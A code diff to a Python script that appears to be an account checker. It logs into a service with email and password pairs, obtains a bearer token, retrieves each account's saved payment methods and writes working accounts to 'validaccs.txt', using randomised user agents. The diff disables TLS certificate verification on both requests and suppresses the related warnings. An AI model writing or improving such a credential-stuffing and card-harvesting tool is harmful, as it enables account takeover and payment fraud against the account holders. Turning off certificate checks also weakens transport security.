@@ -4,7 +4,9 @@ import random
 import time
 from fake_useragent import UserAgent
 from colorama import init, Fore
+from urllib3.exceptions import InsecureRequestWarning
 
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 init(autoreset=True)
 
 def login_and_check_cards(email, password):
@@ -24,7 +26,7 @@ def login_and_check_cards(email, password):
         "errors": {}
     }
 
-    response = requests.post(url, headers=headers, json=data)
+    response = requests.post(url, headers=headers, json=data, verify=False)
 
     if 'result":"success' in response.text:
         json_data = response.json()
@@ -48,7 +50,7 @@ def login_and_check_cards(email, password):
             'Authorization': 'Bearer ' + token,
             'User-Agent': ua.random
         }
-        getcarddata = requests.get(getcard, headers=getcardheaders)
+        getcarddata = requests.get(getcard, headers=getcardheaders, verify=False)
         cards = getcarddata.json().get('paymethods', [])  
 
         with open('validaccs.txt', 'a') as valid_file:
